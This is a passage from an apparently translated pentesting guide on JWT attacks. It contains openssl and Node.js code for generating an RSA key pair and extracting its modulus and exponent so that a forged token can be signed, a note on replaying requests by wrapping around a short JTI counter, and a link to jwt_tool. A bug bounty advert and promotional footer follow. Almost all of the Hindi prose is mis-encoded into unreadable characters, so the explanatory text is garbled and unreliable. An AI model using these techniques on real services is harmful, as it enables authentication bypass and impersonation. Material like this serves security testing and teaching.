var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
рдПрдХ рдирдпрд╛ рдирд┐рдЬреА/рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЯреЛрдХрди рдореЗрдВ рдирдпреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдирд╛ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
рдЖрдк рдЗрд╕ рдиреЛрдбрдЬреЗрдПрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ "n" рдФрд░ "e" рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
рдЕрдВрдд рдореЗрдВ, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдФрд░ рдирдП "n" рдФрд░ "e" рдорд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк [jwt.io](https://jwt.io) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдорд╛рдиреНрдп JWT рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред

### JTI (JWT ID)

JTI (JWT ID) рдХреНрд▓реЗрдо рдПрдХ JWT рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЯреЛрдХрди рдХреЛ рдлрд┐рд░ рд╕реЗ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕реЛрдЪрд┐рдП рдПрдХ рд╕реНрдерд┐рддрд┐ рдЬрд╣рд╛рдВ ID рдХреА рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ 4 рд╣реИ (0001-9999)ред рдЕрдиреБрд░реЛрдз 0001 рдФрд░ 10001 рдПрдХ рд╣реА ID рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдмреИрдХрдПрдВрдб рд╣рд░ рдЕрдиреБрд░реЛрдз рдкрд░ ID рдХреЛ рдмрдврд╝рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рдлрд┐рд░ рд╕реЗ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдкреНрд░рддреНрдпреЗрдХ рд╕рдлрд▓ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рдмреАрдЪ 10000 рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА)ред

### JWT рдкрдВрдЬреАрдХреГрдд рдХреНрд▓реЗрдо

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### рдЙрдкрдХрд░рдг

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдпреБрдХреНрддрд┐**: **Intigriti** рдореЗрдВ **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), рдФрд░ **$100,000** рддрдХ рдХреЗ рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдЕрдзрд┐рдХрд╛рд░** рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред**

</details>
